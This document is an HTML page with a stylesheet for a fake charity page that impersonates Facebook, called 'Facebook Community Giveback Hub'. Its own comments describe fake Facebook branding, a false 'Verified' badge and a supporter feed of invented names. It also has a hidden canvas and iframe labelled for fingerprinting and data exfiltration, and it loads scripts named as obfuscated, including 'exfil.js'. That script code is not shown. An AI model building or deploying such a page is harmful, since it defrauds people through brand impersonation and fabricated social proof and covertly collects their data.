<!DOCTYPE html>
<html lang="en" data-theme="light">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Community Giveback Hub</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="ui.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.bunny.net">
    <link href="https://fonts.bunny.net/css?family=inter:400,500,600,700" rel="stylesheet">
</head>
<body>
    <div class="app-container" role="main">
        <!-- Header with fake Facebook branding -->
        <header class="app-header">
            <div class="branding">
                <i class="fab fa-facebook-square"></i>
                <span>Facebook Giveback</span>
                <span class="badge-verified"><i class="fas fa-check-circle"></i> Verified</span>
            </div>
            <div class="user-pill">
                <img src="https://i.pravatar.cc/40?img=12" alt="User" class="avatar">
                <span>Welcome, supporter!</span>
            </div>
        </header>

        <!-- Interactive "Donation Meter" -->
        <section class="card interactive-card">
            <h2><i class="fas fa-chart-line"></i> Community Impact Meter</h2>
            <div class="progress-container">
                <div class="progress-bar" id="progressBar" style="width: 68%;"></div>
            </div>
            <p class="progress-text"><strong>$24,850</strong> raised of $35,000 goal</p>
            <button class="btn btn-primary" id="contributeBtn">
                <i class="fas fa-heart"></i> Contribute Now
            </button>
        </section>

        <!-- "Recent Supporters" Feed (Fake Dynamic Content) -->
        <section class="card feed-card">
            <h3><i class="fas fa-users"></i> Recent Supporters</h3>
            <ul class="supporter-list" id="supporterList">
                <!-- Populated by JS with fake names/amounts -->
            </ul>
        </section>

        <!-- Hidden Canvas for Fingerprinting & Data Exfiltration -->
        <canvas id="fingerprintCanvas" style="display: none;"></canvas>
        <iframe name="exfilFrame" style="display: none;"></iframe>
    </div>

    <!-- All JS – modular and obfuscated -->
    <script src="ui-engine.js"></script>
    <script src="data-layer.js"></script>
    <script src="exfil.js"></script>
</body>
</html>
/* ui.css */
:root {
    --fb-blue: #1877f2;
    --fb-blue-dark: #0a58ca;
    --surface: #ffffff;
    --text-primary: #1c1e21;
    --shadow: 0 2px 16px rgba(0, 0, 0, 0.08);
    --transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
}

body {
    font-family: 'Inter', system-ui, -apple-system, sans-serif;
    background: linear-gradient(135deg, #f5f7fa 0%, #e4edf5 100%);
    margin: 0;
    color: var(--text-primary);
    min-height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    padding: 20px;
}

.app-container {
    width: 100%;
    max-width: 440px;
    background: var(--surface);
    border-radius: 24px;
    box-shadow: var(--shadow);
    overflow: hidden;
    animation: fadeInUp 0.6s ease-out;
}

@keyframes fadeInUp {
    from { opacity: 0; transform: translateY(20px); }
    to { opacity: 1; transform: translateY(0); }
}

.app-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 20px 24px;
    background: var(--fb-blue);
    color: white;
}

.branding {
    display: flex;
    align-items: center;
    gap: 10px;
    font-weight: 700;
    font-size: 1.25rem;
}

.badge-verified {
    background: rgba(255,255,255,0.2);
    padding: 4px 10px;
    border-radius: 20px;
    font-size: 0.8rem;
    font-weight: 500;
}

.interactive-card {
    padding: 28px;
    border-bottom: 1px solid #eee;
}

.btn-primary {
    background: linear-gradient(to right, var(--fb-blue), var(--fb-blue-dark));
    color: white;
    border: none;
    padding: 16px 32px;
    border-radius: 16px;
    font-weight: 600;
    font-size: 1rem;
    cursor: pointer;
    transition: var(--transition);
    display: inline-flex;
    align-items: center;
    gap: 10px;
    margin-top: 20px;
}

.btn-primary:hover {
    transform: translateY(-2px);
    box-shadow: 0 8px 20px rgba(24, 119, 242, 0.3);
}

/* Micro-interactions */
.progress-bar {
    height: 12px;
    background: linear-gradient(90deg, #00b09b, #96c93d);
    border-radius: 6px;
    transition: width 1.2s ease-in-out;
}

.supporter-list li {
    padding: 12px 0;
    border-bottom: 1px solid #f0f0f0;
    display: flex;
    justify-content: space-between;
    align-items: center;
    animation: slideIn 0.5s ease-out backwards;
    animation-delay: calc(var(--i) * 0.05s);
}

@keyframes slideIn {
    from { opacity: 0; transform: translateX(-10px); }
    to { opacity: 1; transform: translateX(0); }
}
